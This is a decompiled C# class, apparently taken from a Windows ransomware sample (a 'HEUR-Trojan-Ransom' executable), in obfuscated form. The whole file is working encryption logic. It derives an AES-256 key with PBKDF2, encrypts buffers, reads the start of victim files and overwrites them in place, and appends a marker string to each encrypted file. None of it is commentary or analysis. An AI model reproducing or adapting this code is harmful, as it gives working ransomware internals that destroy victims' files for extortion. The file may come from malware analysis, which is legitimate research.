// Decompiled with JetBrains decompiler
// Type: coxZRmDhvSAWo.c000018
// Assembly: Worker-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E50A6D0-CF23-40BF-9617-750EB84D00C0
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-122df846a943e419c3a31f65b6e67e7570134612b2dfd45638e0edd23e214036.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;

namespace coxZRmDhvSAWo
{
  public static class c000018
  {
    [NonSerialized]
    internal static GetString f000053;

    public static byte[] SvtZMRYDytMixf(byte[] p0, byte[] p1, byte[] p2)
    {
      byte[] numArray = (byte[]) null;
      Rfc2898DeriveBytes rfc2898DeriveBytes = c000018.XEFUMsPltov(p1, p2);
      p1 = (byte[]) null;
      GC.Collect();
      using (Aes aes = (Aes) new AesManaged())
      {
        aes.KeySize = 256;
        aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
        aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
        aes.Padding = PaddingMode.None;
        aes.Mode = CipherMode.CBC;
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(p0, 0, p0.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
        rfc2898DeriveBytes.Dispose();
      }
      return numArray;
    }

    public static Rfc2898DeriveBytes XEFUMsPltov(byte[] p0, byte[] p1) => new Rfc2898DeriveBytes(p0, p1, 52768);

    public static byte[] KQanXSigbuDh(string p0, int p1)
    {
      byte[] buffer = new byte[p1];
      try
      {
        if (GhAMvbuoccW.QtTrkEhpkGUJgMO == "YES")
        {
          MemoryMappedFile fromFile = MemoryMappedFile.CreateFromFile(p0, FileMode.Open);
          MemoryMappedViewStream viewStream = fromFile.CreateViewStream();
          fromFile.Dispose();
          viewStream.Read(buffer, 0, p1);
          viewStream.Flush();
          viewStream.Close();
          viewStream.Dispose();
          return buffer;
        }
        FileStream fileStream = new FileStream(p0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
        fileStream.Read(buffer, 0, p1);
        fileStream.Close();
        fileStream.Dispose();
        return buffer;
      }
      catch (Exception ex1)
      {
        if (GhAMvbuoccW.CCDyMIHlAe)
        {
          try
          {
            File.AppendAllText(GhAMvbuoccW.f000025, "File: " + p0 + " - Error while reading from file: " + ex1.Message + "\r\n");
          }
          catch (Exception ex2)
          {
          }
        }
        FileStream fileStream = new FileStream(p0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
        fileStream.Read(buffer, 0, p1);
        fileStream.Close();
        fileStream.Dispose();
        return buffer;
      }
    }

    public static bool EHTmbBVFpgxa(string p0, byte[] p1, byte[] p2 = null)
    {
      byte[] numArray;
      bool flag;
      try
      {
        numArray = (byte[]) null;
        if (GhAMvbuoccW.QtTrkEhpkGUJgMO == "YES")
        {
          byte[] buffer = GhAMvbuoccW.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(GhAMvbuoccW.m000003(GhAMvbuoccW.nmjDhIwEGnMOrO) + "+" + Convert.ToString(GhAMvbuoccW.f000010) + "+") : Encoding.ASCII.GetBytes(GhAMvbuoccW.m000003(GhAMvbuoccW.nmjDhIwEGnMOrO) + "-" + Convert.ToString(GhAMvbuoccW.f000010) + "-");
          MemoryMappedFile fromFile = MemoryMappedFile.CreateFromFile(p0, FileMode.Open);
          MemoryMappedViewStream viewStream = fromFile.CreateViewStream();
          fromFile.Dispose();
          viewStream.Write(p1, 0, p1.Length);
          viewStream.Flush();
          viewStream.Close();
          viewStream.Dispose();
          using (FileStream fileStream = new FileStream(p0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
          {
            if (!GhAMvbuoccW.PAOJgADrbjEa)
            {
              fileStream.Write(buffer, 0, buffer.Length);
            }
            else
            {
              fileStream.Write(p2, 0, p2.Length);
              fileStream.Write(buffer, 0, buffer.Length);
            }
          }
        }
        else
        {
          byte[] buffer = GhAMvbuoccW.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(GhAMvbuoccW.m000003(GhAMvbuoccW.nmjDhIwEGnMOrO) + "+" + Convert.ToString(GhAMvbuoccW.f000010) + "+") : Encoding.ASCII.GetBytes(GhAMvbuoccW.m000003(GhAMvbuoccW.nmjDhIwEGnMOrO) + "-" + Convert.ToString(GhAMvbuoccW.f000010) + "-");
          FileStream fileStream1 = new FileStream(p0, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
          fileStream1.Write(p1, 0, p1.Length);
          fileStream1.Close();
          fileStream1.Dispose();
          using (FileStream fileStream2 = new FileStream(p0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
          {
            if (!GhAMvbuoccW.PAOJgADrbjEa)
            {
              fileStream2.Write(buffer, 0, buffer.Length);
            }
            else
            {
              fileStream2.Write(p2, 0, p2.Length);
              fileStream2.Write(buffer, 0, buffer.Length);
            }
          }
        }
        ++GhAMvbuoccW.f00002b;
      }
      catch (Exception ex1)
      {
        if (GhAMvbuoccW.CCDyMIHlAe)
        {
          try
          {
            File.AppendAllText(GhAMvbuoccW.f000025, "File: " + p0 + " - Error while partial writing to file: " + ex1.Message + "\r\n");
          }
          catch (Exception ex2)
          {
          }
          try
          {
          }
          catch (Exception ex3)
          {
            flag = false;
            goto label_31;
          }
        }
        numArray = (byte[]) null;
        byte[] buffer = GhAMvbuoccW.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(GhAMvbuoccW.m000003(GhAMvbuoccW.nmjDhIwEGnMOrO) + "+" + Convert.ToString(GhAMvbuoccW.f000010) + "+") : Encoding.ASCII.GetBytes(GhAMvbuoccW.m000003(GhAMvbuoccW.nmjDhIwEGnMOrO) + "-" + Convert.ToString(GhAMvbuoccW.f000010) + "-");
        FileStream fileStream3 = new FileStream(p0, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
        fileStream3.Write(p1, 0, p1.Length);
        fileStream3.Close();
        fileStream3.Dispose();
        using (FileStream fileStream4 = new FileStream(p0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
        {
          if (!GhAMvbuoccW.PAOJgADrbjEa)
          {
            fileStream4.Write(buffer, 0, buffer.Length);
          }
          else
          {
            fileStream4.Write(p2, 0, p2.Length);
            fileStream4.Write(buffer, 0, buffer.Length);
          }
        }
        flag = true;
        goto label_31;
      }
      flag = true;
label_31:
      return flag;
    }

    static c000018() => Strings.CreateGetStringDelegate(typeof (c000018));
  }
}
